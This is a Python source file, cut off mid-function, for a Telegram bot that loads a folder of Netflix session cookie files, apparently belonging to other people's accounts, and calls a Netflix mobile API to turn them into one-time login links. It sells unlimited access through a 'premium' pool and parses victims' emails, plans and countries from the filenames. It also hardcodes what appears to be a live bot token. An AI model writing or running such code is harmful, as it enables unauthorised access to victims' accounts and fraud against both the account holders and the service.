import asyncio
import json
import logging
import os
import random
import re
import time
import urllib.parse
from collections import defaultdict
from datetime import datetime, timezone, timedelta
from html import escape
from logging.handlers import RotatingFileHandler

import requests
import urllib3

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

# ==================== CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8419778721:AAHhCD8qDIaP0u54tFN2qowMTR-s8Chu4mY").strip()
if not BOT_TOKEN:
    raise SystemExit("Set BOT_TOKEN environment variable before running.")

OWNER_IDS = {
    5954938418,
}

DAILY_LIMIT = 3
UNLIMITED = 999999
OWNER_USERNAME = "@username_demo"
TIMEZONE = timezone(timedelta(hours=8))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FOLDER = os.path.join(SCRIPT_DIR, "NetCookie")
USAGE_FILE = os.path.join(SCRIPT_DIR, "usage.json")
PREMIUM_FILE = os.path.join(SCRIPT_DIR, "premium.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "bot.log")

# Auto-premium detection (case-insensitive substring match on filename)
PREMIUM_KEYWORDS = ("premium", "vip", "⭐")

# Cooldown between /get calls per user (seconds)
COOLDOWN_SECONDS = 8
# Self-destruct URL messages after N seconds (0 = disable)
SELF_DESTRUCT_SECONDS = 300
# Cleanup usage entries older than N days
USAGE_RETENTION_DAYS = 90

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"true","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
URL_ENCODED_COOKIE_KEYS = ("OptanonConsent",)
REQUIRED_COOKIE = "NetflixId"

# Silence SSL warnings (Netflix API endpoint sometimes has cert quirks)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global locks & state
_quota_lock = asyncio.Lock()
_last_call = defaultdict(float)
START_TIME = time.time()


# ==================== LOGGER ====================
logger = logging.getLogger("netflix_bot")
logger.setLevel(logging.INFO)
_handler = RotatingFileHandler(LOG_FILE, maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8")
_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s %(message)s"))
logger.addHandler(_handler)

_console = logging.StreamHandler()
_console.setFormatter(logging.Formatter("[%(asctime)s] %(message)s"))
logger.addHandler(_console)


def log(msg, level="info"):
    getattr(logger, level, logger.info)(msg)


# ==================== USAGE TRACKING ====================
def _today_str():
    return datetime.now(TIMEZONE).strftime("%Y-%m-%d")


def load_usage():
    if not os.path.exists(USAGE_FILE):
        return {}
    try:
        with open(USAGE_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, dict) else {}
    except Exception as exc:
        log(f"load_usage failed: {exc}", "warning")
        return {}


def save_usage(data):
    try:
        tmp = USAGE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        os.replace(tmp, USAGE_FILE)
        return True
    except Exception as exc:
        log(f"save_usage failed: {exc}", "error")
        return False


# ==================== PREMIUM ====================
def load_premium():
    if not os.path.exists(PREMIUM_FILE):
        return set()
    try:
        with open(PREMIUM_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return set(str(k) for k in data.keys())
        if isinstance(data, list):
            return set(str(k) for k in data)
        return set()
    except Exception as exc:
        log(f"load_premium failed: {exc}", "warning")
        return set()


def save_premium(data):
    try:
        tmp = PREMIUM_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump({k: True for k in data}, fh, indent=2)
        os.replace(tmp, PREMIUM_FILE)
    except Exception as exc:
        log(f"save_premium failed: {exc}", "error")


def is_premium(user_id):
    return str(user_id) in load_premium()


def add_premium(user_id):
    data = load_premium()
    data.add(str(user_id))
    save_premium(data)


def remove_premium(user_id):
    data = load_premium()
    data.discard(str(user_id))
    save_premium(data)


def is_owner(user_id):
    return user_id in OWNER_IDS


def has_unlimited(user_id):
    return is_owner(user_id) or is_premium(user_id)


def can_use_premium_pool(user_id):
    """Owner + premium users can access premium cookie pool."""
    return is_owner(user_id) or is_premium(user_id)


# ==================== QUOTA ====================
def get_remaining(user_id):
    if has_unlimited(user_id):
        return UNLIMITED
    data = load_usage()
    today = _today_str()
    entry = data.get(str(user_id), {})
    if entry.get("date") != today:
        return DAILY_LIMIT
    used = entry.get("count", 0)
    return max(0, DAILY_LIMIT - used)


def consume_quota(user_id):
    if has_unlimited(user_id):
        return UNLIMITED
    data = load_usage()
    today = _today_str()
    key = str(user_id)
    entry = data.get(key, {})
    if entry.get("date") != today:
        entry = {"date": today, "count": 0}
    entry["count"] = entry.get("count", 0) + 1
    data[key] = entry
    save_usage(data)
    return max(0, DAILY_LIMIT - entry["count"])


def get_global_stats():
    data = load_usage()
    today = _today_str()
    total_users = len(data)
    today_users = sum(1 for v in data.values() if v.get("date") == today)
    today_requests = sum(v.get("count", 0) for v in data.values() if v.get("date") == today)
    return {
        "total_users": total_users,
        "today_users": today_users,
        "today_requests": today_requests,
    }


def reset_user_quota(user_id):
    data = load_usage()
    data.pop(str(user_id), None)
    save_usage(data)


def reset_all_quota():
    save_usage({})


# ==================== COOKIE HANDLING ====================
def _classify_cookie_files():
    """Return (public_files, premium_files) auto-detected by filename."""
    if not os.path.isdir(COOKIE_FOLDER):
        os.makedirs(COOKIE_FOLDER, exist_ok=True)
        return [], []

    all_files = [
        f for f in os.listdir(COOKIE_FOLDER)
        if f.lower().endswith(".txt")
        and os.path.isfile(os.path.join(COOKIE_FOLDER, f))
    ]

    public, premium = [], []
    for f in all_files:
        low = f.lower()
        if any(kw.lower() in low for kw in PREMIUM_KEYWORDS):
            premium.append(f)
        else:
            public.append(f)

    return public, premium


def get_cookie_files():
    return _classify_cookie_files()[0]


def get_premium_cookie_files():
    return _classify_cookie_files()[1]


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(key, value):
    if key in URL_ENCODED_COOKIE_KEYS and isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    # Netscape format
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        for k, v in parse_netscape_cookie_line(line).items():
            cookie_dict[k] = _decode_cookie_value(k, v)

    # JSON formats
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(name, value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(key, value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(name, value)

    # Plain key=value fallback
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(key, match.group(1))

    return cookie_dict


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL, params=QUERY_PARAMS, headers=headers, timeout=30, verify=True,
    )
    response.raise_for_status()

    data = response.json()
    if not isinstance(data, dict):
        raise ValueError("Unexpected API response shape")

    value = data.get("value")
    if not isinstance(value, dict):
        raise ValueError("Missing value dict")
    if value.get("error") or data.get("errors"):
        raise ValueError("API error")

    token_data = (
        ((value.get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token in response")

    if isinstance(expires, int) and expires > 10 ** 12:
        expires //= 1000

    return token, expires


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires, tz=TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def is_expired(expires):
    if not isinstance(expires, (int, float)):
        return True
    try:
        return datetime.now(TIMEZONE).timestamp() >= expires
    except Exception:
        return True


def parse_cookie_filename_info(filename):
    info = {
        "plan": "Unknown",
        "payments": "-",
        "extra": "-",
        "country": "-",
        "email": "-",
    }
    if not filename:
        return info

    name = filename
    if name.lower().endswith(".txt"):
        name = name[:-4]

    brackets = re.findall(r"\[([^\]]*)\]", name)
    if len(brackets) >= 5:
        info["plan"] = brackets[0].strip() or "Unknown"
        info["payments"] = brackets[1].strip()
        info["extra"] = brackets[2].strip()
        info["country"] = brackets[3].strip()
        info["email"] = brackets[4].strip()
    elif len(brackets) >= 1:
        info["plan"] = brackets[0].strip() or "Unknown"

    # Fallback email regex
    if info["email"] == "-":
        m = re.search(r"[\w\.\-]+@[\w\.\-]+\.\w+", name)
        if m:
            info["email"] = m.group(0)

    return info


# ==================== CORE ====================
def _try_pool(files, max_attempts):
    """Attempt to fetch a valid nftoken from a list of cookie filenames."""
    reasons = []
    if not files:
        return False, None, None, "no cookie files", None, None

    shuffled = list(files)
    random.shuffle(shuffled)

    for chosen_file in shuffled[:max_attempts]:
        chosen_path = os.path.join(COOKIE_FOLDER, chosen_file)

        try:
            with open(chosen_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
        except Exception:
            continue

        if not content:
            continue

        cookie_dict = extract_cookie_dict(content)
        if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
            reasons.append("no NetflixId")
            continue

        try:
            token, expires = fetch_nftoken(cookie_dict)
        except requests.HTTPError as exc:
            code = exc.response.status_code if exc.response is not None else "?"
            reasons.append(f"HTTP {code}")
            continue
        except Exception as exc:
            reasons.append(type(exc).__name__)
            continue

        if not token:
            reasons.append("empty token")
            continue

        if is_expired(expires):
            reasons.append("expired")
            continue

        info = parse_cookie_filename_info(chosen_file)
        return True, build_nftoken_link(token), expires, None, chosen_file, info

    summary = "; ".join(reasons[-3:]) if reasons else "unknown"
    return False, None, None, summary, None, None


def try_get_login_url(max_attempts=15, premium=False):
    """
    premium=True  → premium pool first, fall back to public
    premium=False → public pool only
    """
    public_files, premium_files = _classify_cookie_files()

    if premium:
        ok, url, exp, err, fname, info = _try_pool(premium_files, max_attempts)
        if ok:
            return True, url, exp, None, fname, info, "premium"

        ok, url, exp, err2, fname, info = _try_pool(public_files, max_attempts)
        if ok:
            return True, url, exp, None, fname, info, "public"

        return (
            False, None, None,
            f"Premium: {err or 'empty'} | Public: {err2 or 'empty'}",
            None, None, None,
        )

    ok, url, exp, err, fname, info = _try_pool(public_files, max_attempts)
    if ok:
        return True, url, exp, None, fname, info, "public"
    return False, None, None, err, None, None, None


# ==================== HELPERS ====================
def mask_id(uid):
    s = str(uid)
    if len(s) <= 6:
        return s
    return f"{s[:4]}***{s[-2:]}"


def mask_email(email):
    if not email or "@" not in email:
        return email
    local, domain = email.split("@", 1)
    if len(local) > 3:
        return f"{local[:3]}***@{domain}"
    elif len(local) > 0:
        return f"{local[0]}***@{domain}"
    return email


def build_main_menu(user_id):
    keyboard = [
        [
            InlineKeyboardButton("🎬 Get URL", callback_data="menu_get"),
            InlineKeyboardButton("📊 My Quota", callback_data="menu_quota"),
        ],
    ]
    if can_use_premium_pool(user_id):
        keyboard.append(
            [InlineKeyboardButton("⭐ Get Premium URL", callback_data="menu_get_premium")]
        )
    keyboard.append(
        [
            InlineKeyboardButton("💎 Premium", callback_data="menu_premium"),
            InlineKeyboardButton("📈 Stats", callback_data="menu_stats"),
        ]
    )
    return InlineKeyboardMarkup(keyboard)


def build_url_message(url, expires, info, quota_line, source):
    masked_email = mask_email(info["email"])
    badge = "⭐ <b>PREMIUM POOL</b>" if source == "premium" else "🎬 <b>PUBLIC POOL</b>"
    return (
        f"🎉 <b>Login URL Generated</b>\n"
        f"{badge}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email</b>   : <code>{escape(masked_email)}</code>\n"
        f"🎬 <b>Plan</b>    : <b>{escape(info['plan'])}</b>\n"
        f"🌍 <b>Region</b>  : <b>{escape(info['country'])}</b>\n"
        f"⏰ <b>Expiry</b>  : <b>{escape(format_expiry(expires))}</b>\n"
        f"{quota_line}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 <b>URL:</b>\n"
        f"<code>{escape(url)}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📖 <b>How to use:</b>\n\n"
        f"<b>1.</b> Copy the URL above 👆\n\n"
        f"<b>2.</b> Open your browser:\n"
        f"   • 🍎 <b>iOS</b> → use <b>Safari</b>\n"
        f"   • 🤖 <b>Android</b> → use <b>Chrome</b>\n\n"
        f"<b>3.</b> Paste the URL in the browser\n\n"
        f"<b>4.</b> Tap <b>\"Open App\"</b> to launch Netflix\n\n"
        f"⚠️ <b>Important:</b>\n"
        f"   ❌ <b>DO NOT</b> use <b>Incognito / Private Mode</b>\n"
        f"   ✅ Use a normal browser only\n"
        f"   ⚡ URL can only be used <b>once</b>\n\n"
        f"💡 <b>Getting \"Restart your membership\"?</b>\n"
        f"   This account needs a new subscription.\n"
        f"   Just tap again to try another account."
    )


def build_quota_line(user_id, remaining_after):
    if is_owner(user_id):
        return "👑 Owner — Unlimited (∞)"
    if is_premium(user_id):
        return "💎 Premium — Unlimited (∞)"
    return f"📊 Remaining: <b>{remaining_after}/{DAILY_LIMIT}</b>"


def _quota_text(user_id):
    if is_owner(user_id):
        return "👑 Owner — Unlimited quota (∞)"
    if is_premium(user_id):
        return "💎 Premium — Unlimited quota (∞)"
    return f"📊 Your quota today: <b>{get_remaining(user_id)}/{DAILY_LIMIT}</b>"


def _premium_text(user_id):
    if is_owner(user_id):
        return "👑 You are the <b>Owner</b>!\nYour quota is unlimited (∞)."
    if is_premium(user_id):
        return (
            "💎 You are a <b>Premium user</b>!\n"
            "Your quota is unlimited (∞) — use /get as much as you want.\n"
            "⭐ You also have access to the <b>Premium Cookie Pool</b>."
        )
    return (
        f"💎 <b>PREMIUM</b> 💎\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ <b>Unlimited</b> quota (∞)\n"
        f"✅ Use /get as much as you want\n"
        f"✅ No daily limit\n"
        f"⭐ Access to the <b>Premium Cookie Pool</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📩 Contact the owner to get premium:\n"
        f"👤 Owner: {OWNER_USERNAME}"
    )


def _stats_text():
    s = get_global_stats()
    public, premium = _classify_cookie_files()
    return (
        f"📈 <b>Bot Statistics</b>\n\n"
        f"👥 Total users: <b>{s['total_users']}</b>\n"
        f"🟢 Active today: <b>{s['today_users']}</b>\n"
        f"🎯 Requests today: <b>{s['today_requests']}</b>\n"
        f"🍪 Public cookies: <b>{len(public)}</b>\n"
        f"⭐ Premium cookies: <b>{len(premium)}</b>"
    )


# ==================== COOLDOWN ====================
def cooldown(seconds=COOLDOWN_SECONDS):
    def deco(func):
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
            user = update.effective_user
            if not user:
                return await func(update, context)
            if is_owner(user.id):
                return await func(update, context)
            now = time.time()
            elapsed = now - _last_call[user.id]
            if elapsed < seconds:
                wait = int(seconds - elapsed) + 1
                if update.callback_query:
                    await update.callback_query.answer(
                        f"⏳ Wait {wait}s before the next request.", show_alert=True
                    )
                else:
                    await update.message.reply_text(
                        f"⏳ Slow down — wait <b>{wait}s</b> before the next request.",
                        parse_mode=ParseMode.HTML,
                    )
                return
            _last_call[user.id] = now
            return await func(update, context)
        return wrapper
    return deco


# ==================== GET FLOW ====================
async def _self_destruct(msg, delay=SELF_DESTRUCT_SECONDS):
    if delay <= 0:
        return
    await asyncio.sleep(delay)
    try:
        await msg.delete()
    except Exception:
        pass


async def _do_get(user_id, reply_fn, edit_fn, context, premium=False):
    if premium and not can_use_premium_pool(user_id):
        await reply_fn(
            "⭐ The <b>Premium Cookie Pool</b> is for Premium / Owner users only.\n\n"
            "💎 Type /premium for info.",
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(user_id),
        )
        return

    async with _quota_lock:
        remaining_before = get_remaining(user_id)

        if remaining_before <= 0:
            await reply_fn(
                f"❌ Your quota is finished for today ({DAILY_LIMIT}/{DAILY_LIMIT}).\n\n"
                f"💎 Want unlimited? Type /premium for info.",
                parse_mode=ParseMode.HTML,
                reply_markup=build_main_menu(user_id),
            )
            return

        msg = await reply_fn("⏳ Generating URL...")

        try:
            result = await asyncio.wait_for(
                asyncio.to_thread(try_get_login_url, 15, premium),
                timeout=90,
            )
        except asyncio.TimeoutError:
            await edit_fn(
                msg,
                "⏱️ <b>Timed out.</b> Try again in a moment.",
                parse_mode=ParseMode.HTML,
                reply_markup=build_main_menu(user_id),
            )
            return
        except Exception as exc:
            log(f"[GET-EXC] user={user_id} err={exc}", "error")
            await edit_fn(
                msg,
                "⚠️ Something went wrong. Try again.",
                parse_mode=ParseMode.HTML,
                reply_markup=build_main_menu(user_id),
            )
            return

        success, url, expires, error, filename, info, source = result

        if not success:
            log(f"[GET-FAIL] user={user_id} premium={premium} reason={error}")
            limit_display = "∞" if has_unlimited(user_id) else DAILY_LIMIT
            await edit_fn(
                msg,
                f"⚠️ <b>Failed to get URL</b>\n\n"
                f"Reason: <code>{escape(str(error))}</code>\n\n"
                f"✅ Your quota was <b>NOT</b> deducted.\n"
                f"📊 Remaining: <b>{remaining_before if has_unlimited(user_id) else remaining_before}/{limit_display}</b>\n\n"
                f"💡 Try again for another account.",
                parse_mode=ParseMode.HTML,
                reply_markup=build_main_menu(user_id),
            )
            return

        remaining_after = consume_quota(user_id)
        log(f"[GET-OK] user={user_id} source={source} file={filename[:60]}")

        quota_line = build_quota_line(user_id, remaining_after)
        text = build_url_message(url, expires, info, quota_line, source)

        await edit_fn(
            msg,
            text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=build_main_menu(user_id),
        )

        # Schedule self-destruct of the URL message
        if SELF_DESTRUCT_SECONDS > 0 and context is not None:
            try:
                context.application.create_task(_self_destruct(msg))
            except Exception:
                pass


# ==================== USER HANDLERS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    remaining = get_remaining(user.id)

    if is_owner(user.id):
        tag = " 👑"
        status = "👑 <b>Owner</b> — Unlimited quota (∞)"
    elif is_premium(user.id):
        tag = " 💎"
        status = "💎 <b>Premium</b> — Unlimited quota (∞)"
    else:
        tag = ""
        status = f"📊 <b>Remaining quota:</b> {remaining}/{DAILY_LIMIT}"

    text = (
        f"👋 Hi {escape(user.first_name)}{tag}!\n\n"
        f"🤖 I can generate Netflix login URLs for you.\n\n"
        f"{status}\n\n"
        f"📌 <b>Commands:</b>\n"
        f"/get - Get login URL\n"
        f"/quota - Check quota\n"
        f"/stats - Bot statistics\n"
        f"/premium - Premium info (unlimited)\n"
    )
    if can_use_premium_pool(user.id):
        text += "/getpremium - Get URL from Premium pool\n"

    if is_owner(user.id):
        text += (
            f"\n👑 <b>Owner Commands:</b>\n"
            f"/reload - Count cookie files\n"
            f"/health - Bot health check\n"
            f"/reset_me - Reset own quota\n"
            f"/reset &lt;user_id&gt; - Reset user quota\n"
            f"/reset_all - Reset all quotas\n"
            f"/broadcast &lt;msg&gt; - Send to all users\n"
            f"/admin_stats - Full statistics\n"
            f"/addpremium - Reply/forward a user to add premium\n"
            f"/delpremium &lt;user_id&gt; - Remove premium\n"
            f"/listpremium - List premium users\n"
        )

    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=build_main_menu(user.id),
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"📖 <b>Help</b>\n\n"
        f"<b>Free tier:</b> {DAILY_LIMIT} URLs per day.\n"
        f"<b>Premium:</b> unlimited + premium cookie pool.\n\n"
        f"🎬 /get — Generate a Netflix login URL\n"
        f"📊 /quota — Check remaining quota\n"
        f"📈 /stats — Bot statistics\n"
        f"💎 /premium — Premium info\n"
        f"❓ /help — This message\n"
    )
    if can_use_premium_pool(user.id):
        text += "⭐ /getpremium — URL from Premium pool\n"
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=build_main_menu(user.id),
    )


async def quota_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        _quota_text(user.id),
        parse_mode=ParseMode.HTML,
        reply_markup=build_main_menu(user.id),
    )


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        _stats_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=build_main_menu(user.id),
    )


@cooldown(COOLDOWN_SECONDS)
async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    async def reply_fn(text, **kw):
        return await update.message.reply_text(text, **kw)

    async def edit_fn(msg, text, **kw):
        return await msg.edit_text(text, **kw)

    await _do_get(user.id, reply_fn, edit_fn, context, premium=False)


@cooldown(COOLDOWN_SECONDS)
async def get_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    async def reply_fn(text, **kw):
        return await update.message.reply_text(text, **kw)

    async def edit_fn(msg, text, **kw):
        return await msg.edit_text(text, **kw)

    await _do_get(user.id, reply_fn, edit_fn, context, premium=True)


async def premium_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        _premium_text(user.id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=build_main_menu(user.id),
    )


# ==================== MENU CALLBACK ====================
@cooldown(COOLDOWN_SECONDS)
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = update.effective_user

    async def reply_fn(text, **kw):
        return await query.message.reply_text(text, **kw)

    async def edit_fn(msg, text, **kw):
        try:
            return await msg.edit_text(text, **kw)
        except Exception:
            return await query.message.reply_text(text, **kw)

    if data == "menu_get":
        await _do_get(user.id, reply_fn, edit_fn, context, premium=False)

    elif data == "menu_get_premium":
        await _do_get(user.id, reply_fn, edit_fn, context, premium=True)

    elif data == "menu_quota":
        await reply_fn(
            _quota_text(user.id),
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(user.id),
        )

    elif data == "menu_premium":
        await reply_fn(
            _premium_text(user.id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=build_main_menu(user.id),
        )

    elif data == "menu_stats":
        await reply_fn(
            _stats_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(user.id),
        )


# ==================== OWNER HANDLERS ====================
def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not user or not is_owner(user.id):
            target = update.callback_query.message if update.callback_query else update.message
            try:
                await target.reply_text("❌ This command is for owner only.")
            except Exception:
                pass
            return
        return await func(update, context)
    return wrapper


@owner_only
async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    public, premium = _classify_cookie_files()
    await update.message.reply_text(
        f"🍪 <b>Cookie pool</b>\n"
        f"Public: <b>{len(public)}</b>\n"
        f"Premium: <b>{len(premium)}</b>",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    public, premium = _classify_cookie_files()
    s = get_global_stats()
    uptime = int(time.time() - START_TIME)
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    usage_kb = os.path.getsize(USAGE_FILE) // 1024 if os.path.exists(USAGE_FILE) else 0
    log_kb = os.path.getsize(LOG_FILE) // 1024 if os.path.exists(LOG_FILE) else 0
    await update.message.reply_text(
        f"🩺 <b>Health</b>\n\n"
        f"🍪 Public cookies: <b>{len(public)}</b>\n"
        f"⭐ Premium cookies: <b>{len(premium)}</b>\n"
        f"👥 Users tracked: <b>{s['total_users']}</b>\n"
        f"🎯 Today's requests: <b>{s['today_requests']}</b>\n"
        f"💾 usage.json: <b>{usage_kb} KB</b>\n"
        f"📜 bot.log: <b>{log_kb} KB</b>\n"
        f"⏱ Uptime: <b>{hours}h {minutes}m {seconds}s</b>",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def reset_me_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    reset_user_quota(user.id)
    await update.message.reply_text("✅ Your quota has been reset.")


@owner_only
async def reset_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /reset <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return
    reset_user_quota(uid)
    await update.message.reply_text(
        f"✅ Quota for <code>{uid}</code> reset.",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def reset_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reset_all_quota()
    await update.message.reply_text("✅ All quotas reset.")


@owner_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    data = load_usage()
    user_ids = list(data.keys())

    sent, failed = 0, 0
    for uid in user_ids:
        try:
            await context.bot.send_message(
                chat_id=int(uid), text=message, parse_mode=ParseMode.HTML,
            )
            sent += 1
            await asyncio.sleep(0.05)  # rate-limit safe
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"📢 Broadcast done.\n✅ Sent: {sent}\n❌ Failed: {failed}"
    )


@owner_only
async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats()
    public, premium = _classify_cookie_files()
    prem = load_premium()
    data = load_usage()
    today = _today_str()

    today_entries = [
